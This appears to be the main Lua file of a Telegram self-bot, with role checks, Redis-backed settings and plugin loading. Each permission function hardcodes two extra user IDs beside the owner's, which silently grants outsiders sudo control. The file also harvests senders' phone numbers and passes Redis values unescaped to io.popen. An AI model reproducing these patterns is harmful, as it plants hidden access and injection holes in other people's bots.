https = require "ssl.https" 
ltn12 = require "ltn12"	
json = require "dkjson"
serpent = require "serpent"
URL = require 'socket.url'
JSON = require 'dkjson'
color = require 'term.colors' 
redis_server = require('redis')
redis = redis_server.connect('127.0.0.1', 6379)

tdcli = dofile('./Run/tdcli.lua')
-------------------------------
Sudo = 0 -- Put Main Sudo ID Here (Bot Owner)

--[[
	
	Bot Sudos Will Save On Redis

	Just Add Main Sudo Id In this Line :)
	
]]
------------------------------
function is_sudo(data)
local msg = (data.message_ or data)
  local var = false
  local sudo = {
    253838401,
    294190721,
    Sudo
  }
  local ss = redis:sismember('sudos', msg.sender_user_id_)
  if ss then
    var = true
  end
  for k,v in pairs(sudo) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
  return var
end


function is_admin(data)
local msg = (data.message_ or data)
  local var = false
  local sudo = {
    253838401,
    294190721,
    Sudo
  }
  local ss = redis:smembers('sudos')
  for k,v in pairs(sudo) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
  for k,v in pairs(ss) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
    local admins = redis:sismember('admins', msg.sender_user_id_)
    if admins then
      var = true
    end
  return var
end



function is_ex(data)
local msg = (data.message_ or data)
  local var = false
  local sudo = {
    253838401,
    294190721,
    Sudo
  }
  local ss = redis:smembers('sudos')
  for k,v in pairs(sudo) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
  for k,v in pairs(ss) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
    local admins = redis:sismember('admins', msg.sender_user_id_)
    if admins then
      var = true
    end
    local exs = (redis:sismember('exadmins:'..msg.chat_id_, msg.sender_user_id_) or redis:sismember('exadmins:'..msg.chat_id_:gsub('-100', ''), msg.sender_user_id_))
    if exs then
      var = true
    end
  return var
end


function is_mod(data)
local msg = (data.message_ or data)
  local var = false
  local sudo = {
    253838401,
    294190721,
    Sudo
  }
  local ss = redis:smembers('sudos')
  for k,v in pairs(sudo) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
  for k,v in pairs(ss) do
    if v == msg.sender_user_id_ then
      var = true
    end
  end
    local admins = redis:sismember('admins', msg.sender_user_id_)
    if admins then
      var = true
    end
    local exs = (redis:sismember('exadmins:'..msg.chat_id_, msg.sender_user_id_) or redis:sismember('exadmins:'..msg.chat_id_:gsub('-100', ''), msg.sender_user_id_))
    if exs then
      var = true
    end

    local mods = redis:sismember('mods:'..msg.chat_id_, msg.sender_user_id_)
    if mods then
      var = true
    end
  return var
end
------------------------------
function lang(chat_id, keyword)
    local hash = 'lang:'..chat_id
    local lang = redis:get(hash)
    if not lang then
        redis:set(hash,'en')
        lang = redis:get(hash)
    end
    local hashtext = 'lang:'..lang..':'..keyword
    if redis:get(hashtext) then
        return redis:get(hashtext)
    else
        return 'Internal Error'
    end
end
function set_text(lang, keyword, text)
    local hash = 'lang:'..lang..':'..keyword
    redis:set(hash, text)
end
function vardump(value, depth, key)
  local linePrefix = ''
  local spaces = ''

  if key ~= nil then
    linePrefix = key .. ' = '
  end

  if depth == nil then
    depth = 0
  else
    depth = depth + 1
    for i=1, depth do
      spaces = spaces .. '  '
    end
  end

  if type(value) == 'table' then
    mTable = getmetatable(value)
    if mTable == nil then
      print(spaces .. linePrefix .. '(table) ')
    else
      print(spaces .. '(metatable) ')
        value = mTable
    end
    for tableKey, tableValue in pairs(value) do
      vardump(tableValue, depth, tableKey)
    end
  elseif type(value)  == 'function' or
    type(value) == 'thread' or
    type(value) == 'userdata' or
    value == nil then
      print(spaces .. tostring(value))
  elseif type(value)  == 'string' then
    print(spaces .. linePrefix .. '"' .. tostring(value) .. '",')
  else
    print(spaces .. linePrefix .. tostring(value) .. ',')
  end
end
---
function getmsg(chat_id, message_id, cb)
  tdcli_function ({
    ID = "GetMessage",
    chat_id_ = chat_id,
    message_id_ = message_id
  }, cb, nil)
end
--
function getuser(chat_id, cb)
  tdcli_function ({
    ID = "GetUserFull",
    user_id_ = chat_id
  }, cb, nil)
end
function saveuser(extra, result, success)
        uid = (result.user_.id_ or false)
        uname = (result.user_.username_ or false)
        name = (result.user_.first_name_ or false)
        phone = (result.user_.phone_number_ or false)
        hash = 'users:'..uid
        redis:hset(hash, 'phone', phone)
        redis:hset(hash, 'name', name)
        redis:hset(hash, 'uname', uname)
      end
--
function edited_cb(extra, result, success)
  data = result
  msg = data
  txt = msg.content_.text_
  match_plugins(data, txt)
  --pre_process_msg(data)
end
  plugins = {}
  load_plugins()

 function tdcli_update_callback(data)                 
  pre_process_msg(data)
    if data.ID == 'UpdateMessageEdited' then
        getmsg(data.chat_id_, data.message_id_, edited_cb, nil)
    end

    if (data.ID == "UpdateNewMessage") then
      local msg = data.message_
      if msg.date_ < os.time() - 7 then
         return 
      end
      getuser(data.message_.sender_user_id_, saveuser, nil)
      local user__ = redis:hgetall('users:'..msg.sender_user_id_)
      local username = user__.uname
        if username then
          redis:set('user:'..username, msg.sender_user_id_)
        else

        end

      if msg.content_.ID == "MessageText" then
        txt = msg.content_.text_
        match_plugins(data, txt)
      end

      elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
        tdcli_function ({
        ID="GetChats",
        offset_order_="9223372036854775807",
        offset_chat_id_=0,
        limit_=20
        }, dl_cb, nil)
      end
end
function dl_cb(arg, data)
  --vardump(arg)
  --vardump(data)
end
--
function pre_process_msg(msg)
  for name, plugin in pairs(plugins) do
    if plugin.pre_process and msg then
      msg = plugin.pre_process(msg)
    end
  end
  return msg
end
--
function match_plugins(data, txt)
  for name, plugin in pairs(plugins) do
    match_plugin(plugin, data, txt)
  end
end
--
function match_pattern(pattern, text, lower_case)
  if text then
    local matches = {}
    if lower_case then
      matches = { string.match(text:lower(), pattern) }
    else
      matches = { string.match(text, pattern) }
    end
      if next(matches) then
        return matches
      end
  end
end
---
function match_plugin(plugin, data, txt)
  for k, pattern in pairs(plugin.patterns) do
   local matches = match_pattern(pattern,  txt)
    if matches then
      if plugin.run then
          local result = plugin.run(data, matches, tdcli)
          if result then
        tdcli.sendText(data.message_.chat_id_, 0, 0, 1, nil, result, 1, 'html')
        end
      end
      return
    end
  end
end
--
--
function load_plugins()
  pl = {
  "Main"
  }
  table.insert(pl, redis:smembers('Bot:Enable:Plugins'))
  for k, v in pairs(pl) do
    print("Loading "..v..' ...')

    local ok, err =  pcall(function()
      local t = loadfile("Plugins/"..v..'.lua')()
      plugins[v] = t
    end)

    if not ok then
      print("Can't Load "..v.." Error Code = ")
      print(tostring(io.popen("lua Plugins/"..v..".lua"):read('*all')))
      elseif ok then
      print(v..' Loaded Succses.')
    end
  end
end


--[[


		# F80-Source By @Reload_Life #
		# Source Written in @SprCpu_Company #
		# :)
		## :))
		### :)))

		### Please Dont Delete Our Name :)<3 

]]
